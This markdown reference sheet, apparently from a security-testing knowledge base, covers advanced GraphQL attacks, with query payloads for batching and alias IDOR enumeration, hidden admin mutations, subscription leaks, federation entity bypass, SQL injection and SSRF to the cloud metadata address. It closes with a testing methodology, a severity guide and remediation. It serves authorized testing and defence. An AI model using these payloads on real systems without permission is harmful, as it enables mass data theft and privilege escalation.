# GraphQL Advanced Attacks
> Source: OWASP GraphQL Cheat Sheet, PortSwigger GraphQL labs, Apollo/Hasura docs | RAG Knowledge Base | Full detail preserved
> Related: `portswigger-advanced.md` (GraphQL basics), `api-testing.md`, `bug-chains.md` CHAIN-014

---

## Overview

Basic GraphQL testing covers introspection and simple IDOR. Advanced attacks exploit batching, aliases, subscriptions, federation, persisted queries, and resolver-level authorization gaps.

---

## Discovery

```
Common endpoints:
/graphql
/api/graphql
/v1/graphql
/query
/altair / /graphiql / /playground  (IDE exposed in prod = info leak)
```

### Introspection Query
```graphql
query {
  __schema {
    types { name fields { name type { name } } }
  }
}
```

If disabled — Clairvoyance (wordlist schema reconstruction), field suggestion errors (`Did you mean "adminUser"?`).

---

## Attack Class 1: Batching Abuse

Send array of queries in single HTTP request — bypass rate limits, WAF, per-request auth checks.

```graphql
[
  {"query": "query { user(id: 1) { email } }"},
  {"query": "query { user(id: 2) { email } }"},
  ...
  {"query": "query { user(id: 10000) { email } }"}
]
```

**Impact:** Mass IDOR enumeration in one request.

---

## Attack Class 2: Alias Abuse

Multiple same-field queries with different args in one request:

```graphql
query {
  u1: user(id: 1) { email phone ssn }
  u2: user(id: 2) { email phone ssn }
  u3: user(id: 3) { email phone ssn }
}
```

Some backends rate-limit by field name not alias — 1000 aliases = 1000 users.

---

## Attack Class 3: Deep Recursion / DoS

```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends { id name }
        }
      }
    }
  }
}
```

Circular schema references → resource exhaustion. Report only if DoS in scope.

---

## Attack Class 4: Mutation Authorization Bypass

Introspection reveals hidden mutations:
```graphql
mutation {
  deleteUser(id: "admin-id") { success }
  updateRole(userId: "self", role: ADMIN) { success }
  createAdminUser(email: "attacker@evil.com") { id }
}
```

Test every mutation with low-privilege token.

---

## Attack Class 5: Subscription Endpoint Abuse

WebSocket subscriptions often have weaker auth than HTTP:

```graphql
subscription {
  userUpdated {
    id email passwordResetToken
  }
}
```

Subscribe to events for other users — real-time data leak.

**Testing:** Connect via wscat/websocat to `/graphql` WebSocket endpoint.

---

## Attack Class 6: Persisted Query Abuse

APQ (Automatic Persisted Queries) — server stores query by hash:

```json
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"HASH"}}}
```

If server accepts arbitrary hash registration → inject malicious query once, invoke by hash bypassing WAF.

---

## Attack Class 7: GraphQL Federation Attacks

Apollo Federation subgraphs expose:

```graphql
query {
  _service { sdl }
  _entities(representations: [{__typename: "User", id: "1"}]) {
    ... on User { email internalNotes }
  }
}
```

**Entity resolution bypass:** Access fields resolved by other subgraphs without their auth checks.

**SDL leak:** `_service { sdl }` reveals full internal schema.

---

## Attack Class 8: Field Duplication / Overloading

```graphql
query {
  user(id: 1) {
    email email email email
    # Some resolvers execute per field request
  }
}
```

Backend N+1 or repeated auth checks — timing side channels or DoS.

---

## Attack Class 9: Injection via GraphQL

### SQLi through GraphQL args
```graphql
query {
  search(filter: "test' OR 1=1--") { results { id } }
}
```

### SSRF via GraphQL
```graphql
mutation {
  importFromUrl(url: "http://169.254.169.254/latest/meta-data/") { status }
}
```

---

## Attack Class 10: IDOR via Node Interface

Global ID encoding (base64):
```
User:1 → dXNlcjox (base64 of "user:1")
```

Decode, modify type/id, re-encode:
```graphql
query {
  node(id: "dXNlcjox") { ... on User { email } }
  node(id: "dXNlcjox") { ... on AdminUser { secrets } }
}
```

---

## Attack Class 11: Fragment Injection

```graphql
query {
  user(id: 1) {
    ... on User { email }
    ... on AdminUser { passwordHash role }
  }
}
```

If inline fragment resolves based on runtime type — access admin fields on user object.

---

## Attack Class 12: Directive Abuse

Custom directives may bypass auth:
```graphql
query {
  sensitiveData @skip(if: false) @include(if: true) { secret }
}
```

Test `@deprecated` fields still accessible in schema.

---

## Testing Methodology

```
1. Introspection or Clairvoyance → full schema map
2. Identify mutations with state change
3. Test each query/mutation with User A token → User B data
4. Batching: 100 queries in one request for IDOR scale
5. Aliases: enumerate IDs 1-1000 in single query
6. WebSocket: test subscription auth
7. Federation: _service, _entities if Apollo
8. APQ: register + replay malicious persisted query
9. Check GraphiQL/Playground exposed in production
10. Field suggestion errors for hidden field names
```

---

## Tools

| Tool | Use |
|---|---|
| InQL (Burp) | Schema analysis, query generation |
| GraphQL Voyager | Schema visualization |
| Clairvoyance | Introspection disabled bypass |
| batchQL | Batch query automation |
| graphql-cop | Security audit |
| Altair / GraphiQL | Manual testing |

---

## Severity Guide

| Finding | Severity |
|---|---|
| Batching IDOR mass PII | Critical |
| Hidden admin mutation | Critical |
| Introspection in prod + sensitive schema | Medium-High |
| Subscription auth bypass | High |
| Federation entity bypass | High-Critical |
| GraphiQL exposed | Low-Medium (info) |

---

## Remediation

- Disable introspection in production
- Query depth/complexity limits
- Rate limit by operation cost not just request count
- Field-level authorization on every resolver
- Disable batching or limit batch size
- Authenticate WebSocket connections independently
- Disable GraphiQL/Playground in production

---

## Related Files

- `portswigger-advanced.md` — GraphQL fundamentals
- `api-testing.md` — REST/GraphQL general testing
- `bug-chains.md` — CHAIN-014 batching IDOR
- `owasp-api-top10-2023.md` — API3, API5, API6
